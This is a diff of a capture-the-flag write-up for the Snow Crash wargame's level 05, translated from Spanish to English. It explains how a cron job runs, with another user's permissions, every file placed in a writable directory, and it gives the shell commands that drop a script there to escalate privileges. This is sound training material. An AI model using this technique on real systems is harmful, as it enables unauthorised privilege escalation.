@@ -1,21 +1,50 @@
-# Cronjob Exploit
+# Snow Crash - Level 05
 
-Al iniciar ha llegado un email, para ver el email hay que ver los archivos de la carpeta /var/email dentro hay un archivo que es level05 al hacer el cat te pone esto:
-`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`
+## Finding the Cronjob
 
-Por lo tanto vemos que es un cronjob y se ejecuta un archivo conm los permisos de flag05 cada 2 minutos.
+Upon logging in, we receive an email. The emails are stored in `/var/mail`, where we find a file named `level05`. Inspecting it with `cat` reveals the following scheduled task:
 
-Si vemos el contenido de ese archivo:
 ```
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
+
+This indicates a cron job that executes `/usr/sbin/openarenaserver` every 2 minutes with `flag05`'s permissions.
+
+## Understanding the Execution Flow
+
+Inspecting the contents of `/usr/sbin/openarenaserver`, we find the following script:
+
+```sh
 #!/bin/sh
 
 for i in /opt/openarenaserver/* ; do
-        (ulimit -t 5; bash -x "$i")
-        rm -f "$i"
+    (ulimit -t 5; bash -x "$i")
+    rm -f "$i"
 done
 ```
-El codigo significa que va a ejecutar todo archivo que este en esa carpeta y luego lo borra.
-Creamos un archivo con el siguiente contenido:
-`echo "/bin/getflag > /tmp/my_file" > /opt/openarenaserver/my_file`
 
-Esperamos dos minutos y se ejecuta con los permisos de flag05 y lo guarda el resultado en el archivo de redireccion que hemos puesto.
+This script executes any file inside `/opt/openarenaserver/` and then deletes it.
+
+## Exploiting the Cronjob
+
+Since we can write files to `/opt/openarenaserver/`, we can create a script that runs `getflag`.
+
+### Steps:
+
+1. Create a malicious script:
+
+   ```bash
+   echo "/bin/getflag > /tmp/my_flag" > /opt/openarenaserver/my_script
+   chmod +x /opt/openarenaserver/my_script
+   ```
+
+2. Wait for the cron job to execute (approximately 2 minutes).
+
+3. Retrieve the flag:
+
+   ```bash
+   cat /tmp/my_flag
+   ```
+
+The flag is now stored in `/tmp/my_flag`, as the script was executed with `flag05`'s permissions.
+
